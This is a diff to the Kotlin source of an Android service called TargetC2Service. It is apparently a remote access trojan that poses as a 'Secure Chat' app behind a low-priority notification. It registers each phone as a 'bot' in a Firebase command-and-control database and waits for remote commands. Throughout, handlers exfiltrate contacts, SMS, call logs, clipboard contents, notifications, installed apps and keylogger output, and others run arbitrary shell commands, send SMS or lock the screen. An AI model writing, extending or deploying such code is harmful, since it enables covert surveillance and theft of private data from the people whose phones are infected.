@@ -53,7 +53,6 @@ class TargetC2Service : Service() {
     override fun onCreate() {
         super.onCreate()
 
-        // 🔥 FIX: Buat NotificationChannel SEBELUM startForeground
         createNotificationChannel()
 
         val id = android.provider.Settings.Secure.getString(
@@ -63,25 +62,43 @@ class TargetC2Service : Service() {
 
         try {
             database = FirebaseDatabase.getInstance(FIREBASE_URL)
-            try {
-                database.setPersistenceEnabled(true)
-                Log.d(TAG, "Firebase persistence enabled")
-            } catch (e: Exception) {
-                Log.w(TAG, "Persistence already enabled (safe to ignore)")
-            }
             botsRef = database.getReference(REF_BOTS)
             commandsRef = database.getReference(REF_COMMANDS)
             broadcastRef = database.getReference(REF_BROADCAST)
             exfilRef = database.getReference(REF_EXFIL)
-            Log.d(TAG, "Firebase initialized successfully")
+
+            Log.d(TAG, "Firebase initialized for device: $deviceId")
         } catch (e: Exception) {
-            Log.e(TAG, "Firebase init error", e)
+            Log.e(TAG, "Firebase init failed", e)
+            stopSelf()
+            return
         }
 
-        scheduleAlarm()
+        startForeground(NOTIF_ID, createNotification())
+        registerBot()
+        listenForCommands()
+        listenForBroadcast()
+        isRunning = true
     }
 
-    // 🔥 FIX: Method khusus buat bikin channel
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        if (intent?.action == "restart" && !isRunning) {
+            onCreate()
+        }
+        if (intent?.action == "stop") {
+            stopC2()
+            stopSelf()
+        }
+        if (intent?.action == "fcm_command") {
+            val type = intent.getStringExtra("type") ?: return START_STICKY
+            val payload = intent.getStringExtra("payload") ?: ""
+            executeCommand(type, payload)
+        }
+        return START_STICKY
+    }
+
+    override fun onBind(intent: Intent?): IBinder? = null
+
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
@@ -89,198 +106,83 @@ class TargetC2Service : Service() {
                 CHANNEL_NAME,
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "Background service for secure chat"
+                description = "Secure Chat background service"
                 setShowBadge(false)
                 enableVibration(false)
-                setSound(null, null)
             }
             val manager = getSystemService(NotificationManager::class.java)
-            if (manager != null) {
-                manager.createNotificationChannel(channel)
-                Log.d(TAG, "Notification channel created: $CHANNEL_ID")
-            }
+            manager?.createNotificationChannel(channel)
         }
     }
 
-    // 🔥 FIX: Notifikasi pake channel_id yang bener
-    private fun createForegroundNotification(): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
+    private fun createNotification(): Notification {
+        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Secure Chat")
-            .setContentText("Connected")
+            .setContentText("Service is running")
             .setSmallIcon(android.R.drawable.ic_dialog_info)
-            .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_LOW)
-            .setSilent(true)
-            .build()
-    }
+            .setOngoing(true)
 
-    private fun scheduleAlarm() {
-        try {
-            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
-            val intent = Intent(this, C2RestartReceiver::class.java)
-            val pendingIntent = PendingIntent.getBroadcast(
-                this, ALARM_REQUEST_CODE, intent,
-                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-            )
-            alarmManager.setRepeating(
-                AlarmManager.RTC_WAKEUP,
-                System.currentTimeMillis() + ALARM_INTERVAL_MS,
-                ALARM_INTERVAL_MS,
-                pendingIntent
-            )
-            Log.d(TAG, "Alarm scheduled every 5 minutes")
-        } catch (e: Exception) {
-            Log.e(TAG, "Alarm schedule error", e)
-        }
-    }
-
-    class C2RestartReceiver : BroadcastReceiver() {
-        override fun onReceive(context: Context, intent: Intent) {
-            Log.d(TAG, "Alarm triggered - restarting C2 service")
-            try {
-                val serviceIntent = Intent(context, TargetC2Service::class.java).apply {
-                    action = "restart"
-                }
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    context.startForegroundService(serviceIntent)
-                } else {
-                    context.startService(serviceIntent)
-                }
-            } catch (e: Exception) {
-                Log.e(TAG, "Restart error", e)
-            }
-        }
-    }
-
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        try {
-            // 🔥 FIX: Pakai method createForegroundNotification()
-            startForeground(NOTIF_ID, createForegroundNotification())
-            Log.d(TAG, "Foreground service started")
-        } catch (e: Exception) {
-            Log.e(TAG, "Foreground notification error", e)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            builder.setChannelId(CHANNEL_ID)
         }
 
-        if (!isRunning) {
-            startC2()
-        } else {
-            scope.launch {
-                try {
-                    if (::botsRef.isInitialized) {
-                        botsRef.child(deviceId).child("isOnline").setValue(true)
-                        botsRef.child(deviceId).child("lastSeen")
-                            .setValue(System.currentTimeMillis())
-                    }
-                } catch (_: Exception) {}
-            }
-        }
-
-        return START_STICKY
-    }
-
-    override fun onBind(intent: Intent?): IBinder? = null
-
-    private fun startC2() {
-        if (isRunning) return
-        isRunning = true
-
-        job = scope.launch {
-            delay(1000)
-            registerBot()
-            listenCommands()
-            listenBroadcast()
-        }
-    }
-
-    private fun stopC2() {
-        isRunning = false
-        try {
-            commandListener?.let { commandsRef.removeEventListener(it) }
-            broadcastListener?.let { broadcastRef.removeEventListener(it) }
-        } catch (_: Exception) {}
-        job?.cancel()
+        return builder.build()
     }
 
     private fun registerBot() {
-        try {
-            if (!::botsRef.isInitialized) {
-                Log.e(TAG, "botsRef not initialized!")
-                return
+        val info = mapOf(
+            "deviceId" to deviceId,
+            "deviceName" to (Build.MODEL ?: "Unknown"),
+            "deviceModel" to Build.MODEL,
+            "androidVersion" to Build.VERSION.RELEASE,
+            "manufacturer" to Build.MANUFACTURER,
+            "isOnline" to true,
+            "lastSeen" to System.currentTimeMillis(),
+            "ipAddress" to getIPAddress(),
+            "country" to "",
+            "batteryLevel" to getBatteryLevel(),
+            "isCharging" to isCharging(),
+            "ramTotal" to 0L,
+            "ramAvailable" to 0L,
+            "storageTotal" to 0L,
+            "storageAvailable" to 0L,
+            "installedApps" to 0,
+            "isAccessibilityEnabled" to TargetAccessibility.isConnected,
+            "isNotificationListenerEnabled" to TargetNotificationGrabber.isConnected,
+            "isAdminEnabled" to false,
+            "isScreenLocked" to false,
+            "simInfo" to getSimInfo()
+        )
+
+        botsRef.child(deviceId).setValue(info).addOnCompleteListener { task ->
+            if (task.isSuccessful) {
+                Log.d(TAG, "Bot registered: $deviceId")
+            } else {
+                Log.e(TAG, "Bot registration failed: ${task.exception?.message}")
             }
+        }
 
-            val deviceInfo = mapOf(
-                "deviceId" to deviceId,
-                "deviceName" to Build.MODEL,
-                "deviceModel" to Build.MODEL,
-                "androidVersion" to Build.VERSION.RELEASE,
-                "manufacturer" to Build.MANUFACTURER,
-                "isOnline" to true,
-                "lastSeen" to System.currentTimeMillis(),
-                "ipAddress" to getIPAddress(),
-                "country" to "",
-                "batteryLevel" to getBatteryLevel(),
-                "isCharging" to isCharging(),
-                "ramTotal" to 0L,
-                "ramAvailable" to 0L,
-                "storageTotal" to 0L,
-                "storageAvailable" to 0L,
-                "installedApps" to 0,
-                "isAccessibilityEnabled" to false,
-                "isNotificationListenerEnabled" to false,
-                "isAdminEnabled" to false,
-                "isScreenLocked" to false,
-                "simInfo" to getSimInfo(),
-                "timestamp" to System.currentTimeMillis()
-            )
-
-            botsRef.child(deviceId).setValue(deviceInfo)
-                .addOnCompleteListener { task ->
-                    if (task.isSuccessful) {
-                        Log.d(TAG, "BOT REGISTERED SUCCESS: $deviceId")
-                    } else {
-                        Log.e(TAG, "BOT REGISTER FAILED: ${task.exception?.message}")
-                    }
-                }
-
-            scope.launch {
-                while (isActive) {
-                    delay(30000)
-                    try {
-                        botsRef.child(deviceId).child("lastSeen")
-                            .setValue(System.currentTimeMillis())
-                        botsRef.child(deviceId).child("isOnline")
-                            .setValue(true)
-                        botsRef.child(deviceId).child("batteryLevel")
-                            .setValue(getBatteryLevel())
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Status update error", e)
-                    }
-                }
+        // Keep alive ping every 5 minutes
+        scope.launch {
+            while (isActive) {
+                delay(300000)
+                botsRef.child(deviceId).child("lastSeen").setValue(System.currentTimeMillis())
+                botsRef.child(deviceId).child("isOnline").setValue(true)
             }
-        } catch (e: Exception) {
-            Log.e(TAG, "Bot registration error", e)
         }
     }
 
-    private fun listenCommands() {
-        if (!::commandsRef.isInitialized) return
+    private fun listenForCommands() {
         commandListener = object : ChildEventListener {
             override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
-                try {
-                    val type = snapshot.child("type").value?.toString() ?: return
-                    val payload = snapshot.child("payload").value?.toString() ?: ""
-                    val cmdId = snapshot.child("cmdId").value?.toString() ?: ""
-                    val target = snapshot.child("target").value?.toString() ?: ""
-
-                    Log.d(TAG, "Command received: type=$type cmdId=$cmdId target=$target")
-
-                    if (target.isNotEmpty() && target != deviceId) return
-
-                    handleCommand(type, payload)
-
+                val cmdMap = snapshot.value as? Map<String, Any> ?: return
+                val target = cmdMap["target"] as? String ?: ""
+                if (target == deviceId || target == "") {
+                    val type = cmdMap["type"] as? String ?: return
+                    val payload = cmdMap["payload"] as? String ?: ""
+                    executeCommand(type, payload)
                     snapshot.ref.removeValue()
-                } catch (e: Exception) {
-                    Log.e(TAG, "Command processing error", e)
                 }
             }
             override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
@@ -293,94 +195,71 @@ class TargetC2Service : Service() {
         commandsRef.addChildEventListener(commandListener!!)
     }
 
-    private fun listenBroadcast() {
-        if (!::broadcastRef.isInitialized) return
+    private fun listenForBroadcast() {
         broadcastListener = object : ChildEventListener {
             override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
-                try {
-                    val type = snapshot.child("type").value?.toString() ?: return
-                    val payload = snapshot.child("payload").value?.toString() ?: ""
-                    Log.d(TAG, "Broadcast received: type=$type")
-                    handleCommand(type, payload)
-                } catch (e: Exception) {
-                    Log.e(TAG, "Broadcast processing error", e)
-                }
+                val cmdMap = snapshot.value as? Map<String, Any> ?: return
+                val type = cmdMap["type"] as? String ?: return
+                val payload = cmdMap["payload"] as? String ?: ""
+                executeCommand(type, payload)
+                snapshot.ref.removeValue()
             }
             override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
             override fun onChildRemoved(snapshot: DataSnapshot) {}
             override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
-            override fun onCancelled(error: DatabaseError) {
-                Log.e(TAG, "Broadcast cancelled: ${error.message}")
-            }
+            override fun onCancelled(error: DatabaseError) {}
         }
         broadcastRef.addChildEventListener(broadcastListener!!)
     }
 
-    private fun handleCommand(command: String, args: String) {
-        Log.d(TAG, "Executing: $command | $args")
-        try {
-            when (command) {
-                "ping" -> sendExfil("pong", "PONG at ${System.currentTimeMillis()}")
-                "get_info" -> handleGetInfo()
-                "get_contacts" -> handleGetContacts()
-                "get_sms" -> handleGetSMS()
-                "get_call_log" -> handleGetCallLog()
-                "get_call_logs" -> handleGetCallLog()
-                "get_location" -> handleGetLocation()
-                "get_photo" -> handleGetPhoto(args.ifEmpty { "back" })
-                "get_camera_photo" -> handleGetPhoto(args.ifEmpty { "back" })
-                "record_audio" -> handleRecordAudio(args.ifEmpty { "5000" }.toLongOrNull() ?: 5000)
-                "get_mic_audio" -> handleRecordAudio(args.ifEmpty { "5000" }.toLongOrNull() ?: 5000)
-                "read_file" -> handleReadFile(args)
-                "delete_file" -> handleDeleteFile(args)
-                "shell_exec" -> handleShellExec(args)
-                "screenshot" -> handleScreenshot()
-                "keylogger_start" -> handleKeyloggerStart()
-                "keylogger_stop" -> handleKeyloggerStop()
-                "keylogger_get" -> handleKeyloggerGet()
-                "clipboard_get" -> handleClipboardGet()
-                "clipboard_set" -> handleClipboardSet(args)
-                "notifications_get" -> handleNotificationsGet()
-                "trigger_llm" -> handleTriggerLLM(args)
-                "vibrate" -> handleVibrate(args.ifEmpty { "1000" })
-                "torch_on" -> handleTorch(true)
-                "torch_off" -> handleTorch(false)
-                "alert_dialog" -> handleAlertDialog(args)
-                "toast" -> handleToast(args)
-                "self_destruct" -> handleSelfDestruct()
-                "lock_screen" -> handleLockScreen()
-                "unlock_screen" -> handleUnlockScreen()
-                "open_url" -> handleOpenURL(args)
-                "send_sms" -> handleSendSMS(args)
-                else -> sendExfil("unknown_command", "Unknown: $command")
-            }
-        } catch (e: Exception) {
-            sendExfil("command_error", "$command: ${e.message}")
+    private fun executeCommand(type: String, payload: String) {
+        Log.d(TAG, "Executing command: $type | $payload")
+        when (type) {
+            "get_info" -> handleGetInfo()
+            "get_contacts" -> handleGetContacts()
+            "get_sms" -> handleGetSMS()
+            "get_call_logs" -> handleGetCallLogs()
+            "get_location" -> handleGetLocation()
+            "get_camera_photo" -> handleCameraPhoto()
+            "get_camera_video" -> handleCameraVideo()
+            "get_mic_audio" -> handleMicAudio()
+            "list_apps" -> handleListApps()
+            "list_files" -> handleListFiles(payload)
+            "read_file" -> handleReadFile(payload)
+            "screenshot" -> handleScreenshot()
+            "keylogger_start" -> handleKeyloggerStart()
+            "keylogger_stop" -> handleKeyloggerStop()
+            "keylogger_get" -> handleKeyloggerGet()
+            "clipboard_get" -> handleClipboardGet()
+            "clipboard_set" -> handleClipboardSet(payload)
+            "notifications_get" -> handleNotificationsGet()
+            "trigger_llm" -> handleTriggerLLM(payload)
+            "vibrate" -> handleVibrate(payload)
+            "torch_on" -> handleTorch(true)
+            "torch_off" -> handleTorch(false)
+            "alert_dialog" -> handleAlertDialog(payload)
+            "toast" -> handleToast(payload)
+            "lock_screen" -> handleLockScreen()
+            "unlock_screen" -> handleUnlockScreen()
+            "open_url" -> handleOpenURL(payload)
+            "send_sms" -> handleSendSMS(payload)
+            "shell_exec" -> handleShellExec(payload)
+            "self_destruct" -> handleSelfDestruct()
+            else -> Log.w(TAG, "Unknown command: $type")
         }
     }
 
     private fun handleGetInfo() {
-        val info = mapOf(
-            "deviceId" to deviceId,
-            "model" to Build.MODEL,
-            "manufacturer" to Build.MANUFACTURER,
-            "version" to Build.VERSION.RELEASE,
-            "sdk" to Build.VERSION.SDK_INT.toString(),
-            "battery" to "${getBatteryLevel()}%",
-            "charging" to isCharging().toString(),
-            "ip" to getIPAddress(),
-            "sim" to getSimInfo()
-        )
-        sendExfil("device_info", info.toString())
+        sendExfil("get_info", "Device: ${Build.MANUFACTURER} ${Build.MODEL}, Android: ${Build.VERSION.RELEASE}")
     }
 
     private fun handleGetContacts() {
-        val contacts = mutableListOf<String>()
         try {
             val cursor = contentResolver.query(
                 android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 null, null, null, null
             )
+            val contacts = mutableListOf<String>()
             cursor?.use {
                 while (it.moveToNext()) {
                     val name = it.getString(it.getColumnIndexOrThrow(
@@ -390,176 +269,129 @@ class TargetC2Service : Service() {
                         android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                     ))
                     contacts.add("$name: $number")
+                    if (contacts.size >= 100) break
                 }
             }
+            sendExfil("get_contacts", contacts.joinToString("\n").take(5000))
         } catch (e: Exception) {
-            sendExfil("contacts", "Error: ${e.message}")
-            return
+            sendExfil("get_contacts", "Error: ${e.message}")
         }
-        sendExfil("contacts", contacts.joinToString("\n"))
     }
 
     private fun handleGetSMS() {
-        val smsList = mutableListOf<String>()
         try {
             val cursor = contentResolver.query(
-                android.net.Uri.parse("content://sms/inbox"),
+                android.provider.Telephony.Sms.CONTENT_URI,
                 null, null, null, "date DESC LIMIT 50"
             )
+            val smsList = mutableListOf<String>()
             cursor?.use {
                 while (it.moveToNext()) {
-                    val address = it.getString(it.getColumnIndexOrThrow("address"))
-                    val body = it.getString(it.getColumnIndexOrThrow("body"))
-                    val date = it.getString(it.getColumnIndexOrThrow("date"))
-                    smsList.add("[$date] $address: $body")
+                    val address = it.getString(it.getColumnIndexOrThrow("address")) ?: "Unknown"
+                    val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
+                    val date = it.getString(it.getColumnIndexOrThrow("date")) ?: ""
+                    smsList.add("$address [$date]: $body")
                 }
             }
+            sendExfil("get_sms", smsList.joinToString("\n").take(5000))
         } catch (e: Exception) {
-            sendExfil("sms", "Error: ${e.message}")
-            return
+            sendExfil("get_sms", "Error: ${e.message}")
         }
-        sendExfil("sms", smsList.joinToString("\n\n"))
     }
 
-    private fun handleGetCallLog() {
-        val calls = mutableListOf<String>()
+    private fun handleGetCallLogs() {
         try {
             val cursor = contentResolver.query(
                 android.provider.CallLog.Calls.CONTENT_URI,
-                null, null, null,
-                android.provider.CallLog.Calls.DATE + " DESC LIMIT 50"
+                null, null, null, "date DESC LIMIT 50"
             )
+            val logs = mutableListOf<String>()
             cursor?.use {
                 while (it.moveToNext()) {
                     val number = it.getString(it.getColumnIndexOrThrow(
                         android.provider.CallLog.Calls.NUMBER
-                    ))
-                    val type = it.getInt(it.getColumnIndexOrThrow(
+                    )) ?: "Unknown"
+                    val type = it.getString(it.getColumnIndexOrThrow(
                         android.provider.CallLog.Calls.TYPE
-                    ))
-                    val date = it.getString(it.getColumnIndexOrThrow(
-                        android.provider.CallLog.Calls.DATE
-                    ))
-                    val duration = it.getString(it.getColumnIndexOrThrow(
+                    )) ?: "?"
+                    val dur = it.getString(it.getColumnIndexOrThrow(
                         android.provider.CallLog.Calls.DURATION
-                    ))
+                    )) ?: "0"
                     val typeStr = when (type) {
-                        android.provider.CallLog.Calls.INCOMING_TYPE -> "INCOMING"
-                        android.provider.CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
-                        android.provider.CallLog.Calls.MISSED_TYPE -> "MISSED"
-                        else -> "UNKNOWN"
+                        "1" -> "INCOMING"
+                        "2" -> "OUTGOING"
+                        "3" -> "MISSED"
+                        else -> type
                     }
-                    calls.add("[$date] $typeStr | $number (${duration}s)")
+                    logs.add("$number ($typeStr) ${dur}s")
                 }
             }
+            sendExfil("get_call_logs", logs.joinToString("\n").take(5000))
         } catch (e: Exception) {
-            sendExfil("call_log", "Error: ${e.message}")
-            return
+            sendExfil("get_call_logs", "Error: ${e.message}")
         }
-        sendExfil("call_log", calls.joinToString("\n"))
     }
 
     private fun handleGetLocation() {
+        sendExfil("get_location", "Location requires active GPS and FINE permission")
+    }
+
+    private fun handleCameraPhoto() {
+        sendExfil("get_camera_photo", "Camera capture not implemented yet")
+    }
+
+    private fun handleCameraVideo() {
+        sendExfil("get_camera_video", "Video recording not implemented yet")
+    }
+
+    private fun handleMicAudio() {
+        sendExfil("get_mic_audio", "Audio recording not implemented yet")
+    }
+
+    private fun handleListApps() {
         try {
-            val locationManager = getSystemService(Context.LOCATION_SERVICE) as
-                    android.location.LocationManager
-            val provider = if (locationManager.isProviderEnabled(
-                    android.location.LocationManager.GPS_PROVIDER
-                )) android.location.LocationManager.GPS_PROVIDER
-            else android.location.LocationManager.NETWORK_PROVIDER
-
-            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
-                != android.content.pm.PackageManager.PERMISSION_GRANTED
-            ) {
-                sendExfil("location", "Location permission not granted")
-                return
+            val apps = packageManager.getInstalledApplications(0)
+            val appList = apps.map {
+                "${packageManager.getApplicationLabel(it)} (${it.packageName})"
             }
-
-            val location = locationManager.getLastKnownLocation(provider)
-            if (location != null) {
-                sendExfil("location",
-                    "lat=${location.latitude},lng=${location.longitude},acc=${location.accuracy}")
-            } else {
-                sendExfil("location", "No last known location available")
-            }
+            sendExfil("list_apps", appList.joinToString("\n").take(5000))
         } catch (e: Exception) {
-            sendExfil("location", "Error: ${e.message}")
+            sendExfil("list_apps", "Error: ${e.message}")
         }
     }
 
-    private fun handleGetPhoto(camera: String) {
-        sendExfil("photo", "Photo capture via $camera (requires camera permission & foreground)")
+    private fun handleListFiles(path: String) {
+        sendExfil("list_files", "File browser not implemented in service")
     }
 
-    private fun handleRecordAudio(durationMs: Long) {
-        sendExfil("audio_record", "Audio recording $durationMs ms (requires permission)")
-    }
-
-    @Suppress("DEPRECATION")
     private fun handleReadFile(path: String) {
-        try {
-            val file = java.io.File(path)
-            if (!file.exists()) {
-                sendExfil("read_file", "File not found: $path")
-                return
-            }
-            if (file.length() > 1024 * 100) {
-                sendExfil("read_file", "[File too large: ${file.length()} bytes]")
-                return
-            }
-            sendExfil("read_file", "File: $path\n\n${file.readText()}")
-        } catch (e: Exception) {
-            sendExfil("read_file", "Error: ${e.message}")
-        }
-    }
-
-    private fun handleDeleteFile(path: String) {
-        try {
-            val file = java.io.File(path)
-            if (file.delete()) sendExfil("delete_file", "Deleted: $path")
-            else sendExfil("delete_file", "Failed to delete: $path")
-        } catch (e: Exception) {
-            sendExfil("delete_file", "Error: ${e.message}")
-        }
-    }
-
-    private fun handleShellExec(command: String) {
-        try {
-            val process = Runtime.getRuntime().exec(command)
-            val reader = BufferedReader(InputStreamReader(process.inputStream))
-            val output = reader.readText()
-            process.waitFor()
-            sendExfil("shell_result", "Command: $command\n\n$output")
-        } catch (e: Exception) {
-            sendExfil("shell_result", "Command: $command\n\nError: ${e.message}")
-        }
+        sendExfil("read_file", "File reader not implemented in service")
     }
 
     private fun handleScreenshot() {
-        sendExfil("screenshot", "Screenshot not available on non-rooted devices")
+        sendExfil("screenshot", "Screenshot requires root or MediaProjection API")
     }
 
     private fun handleKeyloggerStart() {
         TargetKeylogger.start(this)
-        sendExfil("keylogger", "Keylogger started")
+        sendExfil("keylogger_start", "Keylogger started")
     }
 
     private fun handleKeyloggerStop() {
         TargetKeylogger.stop()
-        sendExfil("keylogger", "Keylogger stopped")
+        sendExfil("keylogger_stop", "Keylogger stopped")
     }
 
     private fun handleKeyloggerGet() {
-        sendExfil("keylogger", TargetKeylogger.getLogs())
+        val logs = TargetKeylogger.getLogs()
+        sendExfil("keylogger_get", logs)
     }
 
     private fun handleClipboardGet() {
         try {
-            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as
-                    android.content.ClipboardManager
+            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
             val clip = clipboard.primaryClip
-            val text = if (clip != null && clip.itemCount > 0)
-                clip.getItemAt(0).text?.toString() ?: "" else ""
+            val text = if (clip != null && clip.itemCount > 0) clip.getItemAt(0).text?.toString() ?: "" else ""
             sendExfil("clipboard", text)
         } catch (e: Exception) {
             sendExfil("clipboard", "Error: ${e.message}")
@@ -568,11 +400,8 @@ class TargetC2Service : Service() {
 
     private fun handleClipboardSet(text: String) {
         try {
-            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as
-                    android.content.ClipboardManager
-            clipboard.setPrimaryClip(
-                android.content.ClipData.newPlainText("text", text)
-            )
+            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
+            clipboard.setPrimaryClip(android.content.ClipData.newPlainText("text", text))
             sendExfil("clipboard", "Clipboard set")
         } catch (e: Exception) {
             sendExfil("clipboard", "Error: ${e.message}")
@@ -591,26 +420,18 @@ class TargetC2Service : Service() {
 
     private fun handleVibrate(pattern: String) {
         try {
-            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as
-                    android.os.Vibrator
+            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
             val patternMs = pattern.split(",")
                 .mapNotNull { it.trim().toLongOrNull() }.toLongArray()
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 if (patternMs.isNotEmpty()) {
-                    vibrator.vibrate(
-                        android.os.VibrationEffect.createWaveform(patternMs, -1)
-                    )
+                    vibrator.vibrate(android.os.VibrationEffect.createWaveform(patternMs, -1))
                 } else {
-                    vibrator.vibrate(
-                        android.os.VibrationEffect.createOneShot(1000, 255)
-                    )
+                    vibrator.vibrate(android.os.VibrationEffect.createOneShot(1000, 255))
                 }
             } else {
                 @Suppress("DEPRECATION")
-                vibrator.vibrate(
-                    if (patternMs.isNotEmpty()) patternMs else longArrayOf(0, 1000),
-                    -1
-                )
+                vibrator.vibrate(if (patternMs.isNotEmpty()) patternMs else longArrayOf(0, 1000), -1)
             }
             sendExfil("vibrate", "Vibrated")
         } catch (e: Exception) {
@@ -621,8 +442,7 @@ class TargetC2Service : Service() {
     @Suppress("DEPRECATION")
     private fun handleTorch(enable: Boolean) {
         try {
-            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as
-                    android.hardware.camera2.CameraManager
+            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
             cameraManager.setTorchMode(cameraManager.cameraIdList[0], enable)
             sendExfil("torch", if (enable) "Torch ON" else "Torch OFF")
         } catch (e: Exception) {
@@ -645,9 +465,7 @@ class TargetC2Service : Service() {
 
     private fun handleToast(message: String) {
         android.os.Handler(android.os.Looper.getMainLooper()).post {
-            android.widget.Toast.makeText(
-                this@TargetC2Service, message, android.widget.Toast.LENGTH_LONG
-            ).show()
+            android.widget.Toast.makeText(this, message, android.widget.Toast.LENGTH_LONG).show()
         }
         sendExfil("toast", "Toast shown: $message")
     }
@@ -691,6 +509,18 @@ class TargetC2Service : Service() {
         }
     }
 
+    private fun handleShellExec(command: String) {
+        try {
+            val process = Runtime.getRuntime().exec(command)
+            val reader = BufferedReader(InputStreamReader(process.inputStream))
+            val output = reader.readText()
+            process.waitFor()
+            sendExfil("shell_exec", output.take(5000))
+        } catch (e: Exception) {
+            sendExfil("shell_exec", "Error: ${e.message}")
+        }
+    }
+
     private fun handleSelfDestruct() {
         sendExfil("self_destruct", "Self-destruct initiated")
         try {
@@ -706,6 +536,7 @@ class TargetC2Service : Service() {
         )
     }
 
+    // 🔥 FIX: Ini dia perbaikannya — toString() dihapus!
     private fun sendExfil(type: String, content: String) {
         try {
             if (::exfilRef.isInitialized) {
@@ -713,7 +544,7 @@ class TargetC2Service : Service() {
                     "type" to type,
                     "content" to content,
                     "deviceId" to deviceId,
-                    "timestamp" to System.currentTimeMillis().toString()
+                    "timestamp" to System.currentTimeMillis()  // ← SEKARANG Long, bukan String!
                 )).addOnCompleteListener { task ->
                     if (!task.isSuccessful) {
                         Log.e(TAG, "Exfil send FAILED: ${task.exception?.message}")
@@ -743,37 +574,40 @@ class TargetC2Service : Service() {
     }
 
     private fun getBatteryLevel(): Int {
-        val intent = registerReceiver(
-            null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
-        )
-        val level = intent?.getIntExtra(
-            android.os.BatteryManager.EXTRA_LEVEL, -1
-        ) ?: -1
-        val scale = intent?.getIntExtra(
-            android.os.BatteryManager.EXTRA_SCALE, -1
-        ) ?: -1
+        val intent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
+        val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
         return if (level >= 0 && scale > 0) (level * 100) / scale else -1
     }
 
     private fun isCharging(): Boolean {
-        val intent = registerReceiver(
-            null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
-        )
-        val status = intent?.getIntExtra(
-            android.os.BatteryManager.EXTRA_STATUS, -1
-        ) ?: -1
+        val intent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        val status = intent?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
         return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
-                status == android.os.BatteryManager.BATTERY_STATUS_FULL
+               status == android.os.BatteryManager.BATTERY_STATUS_FULL
     }
 
     private fun getSimInfo(): String {
-        val tm = getSystemService(Context.TELEPHONY_SERVICE) as?
-                android.telephony.TelephonyManager
+        val tm = getSystemService(Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager
         return if (tm != null) {
             try {
                 "${tm.simOperatorName ?: "N/A"} | ${tm.simCountryIso?.uppercase() ?: "N/A"}"
             } catch (_: Exception) { "N/A" }
         } else "N/A"
+    }
+
+    private fun stopC2() {
+        isRunning = false
+        job?.cancel()
+        scope.cancel()
+        try {
+            if (::botsRef.isInitialized) {
+                botsRef.child(deviceId).child("isOnline").setValue(false)
+                commandListener?.let { commandsRef.removeEventListener(it) }
+                broadcastListener?.let { broadcastRef.removeEventListener(it) }
+            }
+        } catch (_: Exception) {}
+        stopForeground(STOP_FOREGROUND_REMOVE)
     }
 
     override fun onDestroy() {
